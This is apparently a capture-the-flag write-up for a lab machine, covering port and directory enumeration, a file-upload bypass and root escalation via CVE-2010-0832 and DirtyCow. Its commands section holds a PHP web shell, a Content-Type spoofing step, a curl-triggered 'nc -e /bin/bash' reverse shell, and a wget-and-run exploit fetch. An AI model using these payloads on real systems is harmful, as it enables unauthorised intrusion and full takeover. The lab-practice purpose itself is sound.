#### Enumeration
- Open Ports `22,80`
- Webpage shows default `apache` web page
- Directory Enumeration on the webpage reveals hidden `torrent` directory
- Further enumeration of the newly found `torrent` directory shows much more files
- In the torrent section of the webpage, an upload functionality is present which requires an account to upload things
- Creating an account and uploading the torrent files doesn't seem interesting

#### Obtaining Shell
##### File Upload 

- In the uploading `screen-shot` page, the web page is excepting users to upload a image file
- If the upload functionality is handled with no cation, a php can be uploaded and executed
- Creating a crafted php.php file and changing the `Content-Type: application/php to Content-Type: image/png` uploads the malicious png file
- In the directory enumeration process, an directory named `uploads` is found and can be used to look for the uploaded files
- User flag is found in `home/george/user.txt`

#### PrivEsc

- Looking at all the files in the `george` 's  home directory, `motd.legal-displayed` is found in the .cache directory
- With the help of `CVE-2010-0832` MOTD file tampering, root shell is obtained

#### DirtyCow Method:

- As this kernal timeline is 2009 which is vulnerable to dirty cow
- Download the source from `https://dirtycow.ninja`, complie and run the exploit to obtain root shell

#### Commands:

**Generating malicious png.php file**
```bash
# creating a simple php reverse shell will image extension
echo '<?php echo system($_GET[‘cmd’]); ?>' > shell.png.php
```

**Obtaining Shell**
```bash
# upload the shell.png.php file in the edit page
# intercept the request and change its content type from application/php to image/png
# start the nc listener on the hacking machine
nc -lvnp 1234

# access the uploaded png.php file to obtain reverse shell
curl 10.10.10.6/torrent/upload/shell.php?cmd=nc -e /bin/bash 10.10.10.10 1234
```

**Listing all files**
```bash
# ls -la is a common one
ls -lAR /home/george

# obtain interactive shell with python
python -c 'import pty; pty.spawn("/bin/bash");'

# transfer the file to the popcorn machine
wget http://10.10.10.10/1234/14399.sh 

# Provide execute permissions and run the script to obtain root
./14399.sh
```

**DirtyCow Method**
```bash
# compile the dirty cow source
gcc -pthread dirty.c -o dirty -lcrypt

# give execution permissions
chmod +x dirty 

# run the exploit
./dirty 

# su as firefart with the password you specified to obtain root shell
```
